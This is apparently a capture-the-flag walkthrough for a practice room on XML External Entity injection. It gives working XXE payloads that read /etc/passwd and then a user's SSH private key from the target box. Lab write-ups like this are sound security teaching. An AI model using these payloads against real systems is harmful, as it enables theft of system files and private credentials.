# Day 4
## XML External Entitiy

The first two task are only about understanding the text. If you cannot grasp the answer just read again carefully.
All answers are in the description if you didn't already know.
(except the last subtask of task 15 but it's easy to figure out if you have answered the previous two or you can just look it up online)

Just try these two simple payload on the box to grasp the general idea of how it works by yourself
+ first
```html
<!DOCTYPE replace [<!ENTITY name "Foe"> ]>
 <userInfo>
  <firstName>Light</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

If you need to display your own name in the first one just change it accordingly (That one will output "Light Foe")


+ second one
```xml
 <?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```


This one is the same, it'll be the same as cat /etc/passwd there is only one non-root non-service non-deamon at the las line.

The next one could get hard but lucky us they stored ssh keys in the standard way. They are usually stored in the home directory into a commonly known directory (I cannot explicit the answer
due to thm's policy) just google it and replace the path accordingly (username with what you know).

For the last answer just use the second payload to retrieve the key

```xml
 <?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///path_to_ssh_key'>]>
<root>&read;</root>
```

and you'll get the key, just trim it and here we go.

Now let's wait for the realese of the next day :hugs:
